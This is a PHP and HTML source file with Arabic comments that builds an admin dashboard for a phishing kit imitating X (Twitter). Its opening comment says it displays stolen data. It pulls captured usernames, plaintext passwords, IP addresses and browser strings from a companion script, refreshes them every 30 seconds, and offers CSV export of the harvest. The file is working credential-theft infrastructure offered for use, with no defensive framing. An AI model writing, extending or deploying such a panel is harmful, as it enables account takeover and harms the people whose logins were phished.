<?php
// لوحة التحكم لعرض البيانات المسروقة
session_start();

// تحقق بسيط من الهوية (يجب تعزيزه في الإنتاج)
if (!isset($_SESSION['admin'])) {
    header('Location: index.html');
    exit();
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم - بيانات X</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: right; }
        th { background-color: #1d9bf0; color: white; }
        .export-btn { background: #1d9bf0; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>البيانات المسجلة - نظام X</h1>
        <button class="export-btn" onclick="exportData()">تصدير إلى CSV</button>
        <div id="credentialsTable"></div>
    </div>

    <script>
        function loadCredentials() {
            fetch('process.php?action=view')
                .then(response => response.json())
                .then(data => {
                    let html = '<table><tr><th>الوقت</th><th>اسم المستخدم</th><th>كلمة المرور</th><th>عنوان IP</th><th>المتصفح</th></tr>';
                    
                    data.forEach(cred => {
                        html += `<tr>
                            <td>${cred.timestamp}</td>
                            <td>${cred.username}</td>
                            <td>${cred.password}</td>
                            <td>${cred.ip_address}</td>
                            <td>${cred.user_agent.substring(0, 50)}...</td>
                        </tr>`;
                    });
                    
                    html += '</table>';
                    document.getElementById('credentialsTable').innerHTML = html;
                });
        }
        
        function exportData() {
            window.open('process.php?action=export', '_blank');
        }
        
        // تحميل البيانات عند فتح الصفحة
        loadCredentials();
        // تحديث البيانات كل 30 ثانية
        setInterval(loadCredentials, 30000);
    </script>
</body>
</html>